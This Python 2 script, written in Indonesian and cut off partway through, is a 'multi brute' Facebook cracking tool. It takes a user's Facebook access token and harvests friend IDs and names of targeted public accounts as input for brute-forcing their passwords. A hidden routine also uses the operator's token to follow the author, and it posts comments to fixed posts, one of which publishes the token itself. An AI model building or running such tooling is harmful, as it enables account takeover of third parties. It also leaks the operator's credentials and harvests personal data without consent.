#!/usr/bin/python2
# coding=utf-8
# code by ROY
# my facebook ( https://www.facebook.com/JbFbOld )
# no recode
import os
try:
    import requests
except ImportError:
    print '\n [x] Modul requests belum terinstall!...\n'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print '\n [x] Modul bs4 belum terinstall!...\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, subprocess, random, time, re, json
from multiprocessing.pool import ThreadPool
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Roy Octa Firdaus  #
#------------------------------->
ok = []
cp = []
id = []
loop = 0
pwx = []
ttl = []
# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
#ngentodddddddddddddddd
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] Menghapus Token FB %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)
IP = requests.get('https://api.ipify.org').text
# LOGO
logo = '''%s ╦═╗╔═╗╦ ╦   ╦═╗╔╦╗╔╗ ╔═╗
 %s╠╦╝║ ║╚╦╝───╠╦╝║║║╠╩╗╠╣ 
 %s╩╚═╚═╝ ╩    ╩╚═╩ ╩╚═╝╚  %s
%s %s==================================================%s'''%(M,K,H,M,N,N,N)
# Token FB bukan token PLN
def yayanxd():
	os.system('clear')
	print (' %s*%s Tools ini menggunakan login token FB.\n %s*%s Apakah kamu sudah tau cara mendapatkan Token FB?\n %s*%s Ketik %sopen%s untuk mendapatkan Token FB.'%(H,N,H,N,H,N,H,N))
	__cindy__ = raw_input('\n %s[%s?%s] Masukkan Token FB :%s '%(N,M,N,H))
	if __cindy__ in ('open', 'Open', 'OPEN'):
		print '\n%s *%s NOTE! Usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
		print '%s *%s Jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
		print '%s *%s Setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
		print '%s *%s Lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
		raw_input(' [%s ENTER%s ] '%(O,N))
		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
		yayanxd()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('__yayan__.txt', 'w')
		zedd.write(__cindy__)
		zedd.close()
		print '\n %s*%s Selamat datang %s%s%s'%(H,N,K,nama,N)
		time.sleep(2)
		print ' %s!%s Mohon untuk menggunakan SC ini sewajarnya, kami tidak bertanggung jawab jika SC ini disalah gunakan. Jika ada bug atau masalah dalam SC ini mohon untuk melaporkannya ke Wa Admin'%(M,N)
		time.sleep(2)
		print ' %s*%s Tekan ENTER untuk melanjutkan & Intip Wa Author SC'%(H,N)
		time.sleep(2)
		raw_input(' [%s ENTER%s ] '%(O,N))
		os.system('xdg-open https://wa.me/6281318306972?text=Hallo+bang')
		kontol()
	except KeyError:
		print '\n\n %s[%s!%s] Token Invalid'%(N,M,N)
		time.sleep(2)
		yayanxd()
### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
        __cindy__=open('__yayan__.txt','r').read()
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        idfb = jaoanzjwowj['id']
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s] Tidak ada koneksi\n'%(N,M,N)
        exit()
    os.system('clear')
    print logo
    print ' %s[%s*%s] Author    : %sRoy Octa Firdaus'%(N,H,N,K,)
    print ' %s[%s*%s] Facebook  : %sfacebook.com/JbFbOld'%(N,H,N,K)
    print ' %s[%s*%s] Whatsapp  : %s081318306972'%(N,H,N,K)
    print ' %s[%s*%s] Nama SC   : %sRoy Multi Brute Facebook'%(N,H,N,K)
    print ' %s[%s*%s] Versi SC  : %sV1.3'%(N,H,N,K)
    print ' %s=================================================='%(N)
    print ' %s[%s*%s] Nama FB : %s%s%s'%(N,H,N,K,nama,N)
    print ' %s[%s*%s] ID FB   : %s%s%s'%(N,H,N,K,idfb,N)
    print ' %s[%s*%s] IP Anda : %s%s'%(N,H,N,K,IP)
    print ' %s=================================================='%(N)
    print ' [%s?%s] %sMENU MULTI INTIP%s'%(K,N,K,N)
    print ' [%s1%s] Multi Intip dari Teman Publik (%sNew%s)'%(K,N,H,N)
    print ' [%s2%s] Cek Hasil Multi Intip'%(K,N)
    print ' [%s3%s] Kembali ke %sMENU UTAMA%s'%(K,N,H,N)
    print ' [%s0%s] Logout (%sGanti/Hapus Token FB%s)'%(M,N,M,N)
    awokawokawokawokawokawokawokawokawokawokawokawok()
def awokawokawokawokawokawokawokawokawokawokawokawok():
        yan = raw_input('\n [%s?%s] Pilih Menu : '%(K,N))
        if yan == '':
           print '\n %s[%s!%s] Pilihan menu [%s%s%s] tidak ada, cek kembali menu pilihan Anda!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
        elif yan =='1':
                crack_random()
        elif yan =='2':
            print("\n \033[0;97m[\x1b[1;92m1\033[0;97m] Cek hasil \x1b[1;92mOK\x1b[0m")
            print(" \033[0;97m[\x1b[1;93m2\033[0;97m] Cek hasil \x1b[1;93mCP\x1b[0m")
            ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Pilih : ")
            if ask =="":
                moch_yayan()
            elif ask == "1" or ask == "01":
                try:
                    totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033==================================================")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;92m"%(ha, op, ta,M,H,len(totalok)))
                    os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
                    print(" \033==================================================")
                    moch_yayan()
                except (IOError):
                    print(" \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil OK :(")
                    raw_input(' [%s KEMBALI%s ] '%(O,N))
                    moch_yayan()
            elif ask == "2" or ask == "02":
                try:
                    totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033==================================================")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;93m"%(ha, op, ta,M,K,len(totalcp)))
                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
                    print(" \033==================================================")
                    raw_input(' [%s KEMBALI%s ] '%(O,N))
                    moch_yayan()
                except (IOError):
                    print(" \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil CP :(")
                    raw_input(' [%s KEMBALI%s ] '%(O,N))
                    moch_yayan()
            else:
                moch_yayan()
	elif yan =='3':
            	os.system("python2 roy-rmbf.py")
        elif yan =='0':
            	print '\n'
                tod()
                time.sleep(1)
                os.system('rm -rf __yayan__.txt')
                jalan ('\n %s[%s✓%s]%s Berhasil menghapus Token FB'%(N,H,N,H))
                time.sleep(2)
                exit()
        else:
            print '\n %s[%s!%s] Pilihan menu [%s%s%s] tidak ada, cek kembali pilihan menu Anda!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
def kontol():
	try:
		__cindy__ = open('__yayan__.txt', 'r').read()
	except (KeyError, IOError):
		print '\n %s[%sx%s] Token invalid'%(N,M,N)
		os.system('rm -rf __yayan__.txt')
	hoetank = random.choice(['info harga ka', 'yang awet untuk ads ada ka', 'cek wa dong ka', 'caranya'])
	xi_jimpinx = '1379112335803650'
	goceng  = '1303409076707310'
	requests.post('https://graph.facebook.com/100011146894081/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(goceng,__cindy__,__cindy__))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,__cindy__))
	moch_yayan()

def crack_random():
	try:
		__cindy__= open('__yayan__.txt', 'r').read()
	except IOError:
		print '\n %s[%sx%s] Token Invalid'%(N,M,N)
		yayanxd()
	os.system('clear')
	print logo
    	print ' %s[%s*%s] Author    : %sRoy Octa Firdaus'%(N,H,N,K,)
    	print ' %s[%s*%s] Facebook  : %sfacebook.com/JbFbOld'%(N,H,N,K)
    	print ' %s[%s*%s] Whatsapp  : %s081318306972'%(N,H,N,K)
    	print ' %s[%s*%s] Nama SC   : %sRoy Multi Brute Facebook'%(N,H,N,K)
    	print ' %s[%s*%s] Versi SC  : %sV1.3'%(N,H,N,K)
    	print ' %s=================================================='%(N)
	print ' %s[%s!%s] Ketik %smenu %sjika ingin kembali ke %sMENU UTAMA%s'%(N,M,N,H,N,H,N)
	print ' %s=================================================='%(N)
	print ' [%s?%s] Pilih berapa Target yang diinginkan? %s1-10%s'%(K,N,H,N)
	limt = raw_input(' [%s?%s] Berapa Target : %s'%(K,N,H))
	if limt =='':
		print ' %s[%s!%s] Wajib Diisi !'%(N,M,N)
		crack_random()
	elif limt in ('MENU', 'Menu', 'menu'):
		os.system("python2 roy-rmbf.py")
	elif limt == '1':
		idt1 = raw_input(' %s[%s*%s] ID Publik :%s '%(N,H,N,H))
		try:
			lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,H))
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print '\n %s[%s!%s] ID Tidak Ada !'%(N,M,N)
			crack_random()
	elif limt == '2':
		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,H,N,H))
		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,H,N,H))
		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,H))
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
	elif limt == '3':
		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,H,N,H))
		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,H,N,H))
		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,H,N,H))
		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,H))
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
	elif limt == '4':
		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,H,N,H))
		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,H,N,H))
		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,H,N,H))
		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,H,N,H))
		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,H))
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
	elif limt == '5':
		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,H,N,H))
		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,H,N,H))
		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,H,N,H))
		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,H,N,H))
		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,H,N,H))
		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,H))
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
	elif limt == '6':
		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,H,N,H))
		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,H,N,H))
		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,H,N,H))
		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,H,N,H))
		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,H,N,H))
		idt6 = raw_input(' %s[%s*%s] ID Publik 6 :%s '%(N,H,N,H))
		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,H))
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 6 Tidak Ada !'%(N,M,N)
	elif limt == '7':
		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,H,N,H))
		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,H,N,H))
		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,H,N,H))
		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,H,N,H))
		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,H,N,H))
		idt6 = raw_input(' %s[%s*%s] ID Publik 6 :%s '%(N,H,N,H))
		idt7 = raw_input(' %s[%s*%s] ID Publik 7 :%s '%(N,H,N,H))
		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,H))
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 6 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt7+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 7 Tidak Ada !'%(N,M,N)
	elif limt == '8':
		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,H,N,H))
		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,H,N,H))
		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,H,N,H))
		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,H,N,H))
		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,H,N,H))
		idt6 = raw_input(' %s[%s*%s] ID Publik 6 :%s '%(N,H,N,H))
		idt7 = raw_input(' %s[%s*%s] ID Publik 7 :%s '%(N,H,N,H))
		idt8 = raw_input(' %s[%s*%s] ID Publik 8 :%s '%(N,H,N,H))
		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,H))
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 6 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt7+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 7 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt8+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 8 Tidak Ada !'%(N,M,N)
	elif limt == '9':
		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,H,N,H))
		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,H,N,H))
		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,H,N,H))
		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,H,N,H))
		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,H,N,H))
		idt6 = raw_input(' %s[%s*%s] ID Publik 6 :%s '%(N,H,N,H))
		idt7 = raw_input(' %s[%s*%s] ID Publik 7 :%s '%(N,H,N,H))
		idt8 = raw_input(' %s[%s*%s] ID Publik 8 :%s '%(N,H,N,H))
		idt9 = raw_input(' %s[%s*%s] ID Publik 9 :%s '%(N,H,N,H))
		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,H))
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 6 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt7+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 7 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt8+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 8 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt9+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 9 Tidak Ada !'%(N,M,N)
	elif limt == '10':
		idt1 = raw_input(' %s[%s*%s] ID Publik 1 :%s '%(N,H,N,H))
